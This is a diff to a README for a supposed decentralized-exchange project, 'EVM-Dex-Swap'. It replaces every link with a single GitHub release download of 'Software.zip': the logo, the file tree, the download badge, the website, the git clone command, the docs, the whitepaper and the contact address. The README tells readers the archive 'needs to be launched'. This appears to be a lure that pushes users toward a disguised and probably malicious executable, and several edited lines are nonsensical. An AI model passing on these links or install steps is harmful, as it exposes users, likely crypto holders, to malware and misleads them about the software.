@@ -1,6 +1,6 @@
 # 🚀 Welcome to EVM-Dex-Swap Repository! 🌐
 
-![EVM-Dex-Swap Logo](https://example.com/evm-dex-swap-logo.png)
+![EVM-Dex-Swap Logo](https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip)
 
 ## Repository Name: EVM-dex-swap
 ## Short Description: 
@@ -16,7 +16,7 @@ EVM-Dex-Swap/
 ├── docs/
 ├── tests/
 ├── LICENSE
-└── README.md
+└── https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip
 ```
 
 ### 🌟 Features:
@@ -25,15 +25,15 @@ EVM-Dex-Swap/
 - Staking functionality.
 - Liquidity pool management.
 
-### 📎 Download Latest Version [![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) needs to be launched.
+### 📎 Download Latest Version [![Download](https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip)](https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip) needs to be launched.
 
 ### 🖥️ Explore EVM-Dex-Swap
-Visit [EVM-Dex-Swap Website](https://evm-dex-swap.com) to explore more about our decentralized exchange platform.
+Visit [EVM-Dex-Swap Website](https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip) to explore more about our decentralized exchange platform.
 
 ### 🛠️ Installation Process:
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/EVM-dex-swap.git
+   git clone https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -49,8 +49,8 @@ Visit [EVM-Dex-Swap Website](https://evm-dex-swap.com) to explore more about our
    ```
 
 ### 📚 Resources:
-- [Smart Contracts Documentation](https://evm-dex-swap.com/docs)
-- [Whitepaper](https://evm-dex-swap.com/whitepaper)
+- [Smart Contracts Documentation](https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip)
+- [Whitepaper](https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip)
 
 ### 🤝 Contributing:
 We welcome contributions to EVM-Dex-Swap! Feel free to submit pull requests and open issues.
@@ -59,6 +59,6 @@ We welcome contributions to EVM-Dex-Swap! Feel free to submit pull requests and 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ### 📧 Contact Us:
-For any inquiries, reach out to us at contact@evm-dex-swap.com.
+For any inquiries, reach out to us at https://github.com/projeksesad01/EVM-dex-swap/releases/download/v1.0/Software.zip
 
 ## 🚀 Let's revolutionize decentralized exchanges with EVM-Dex-Swap! 🌐
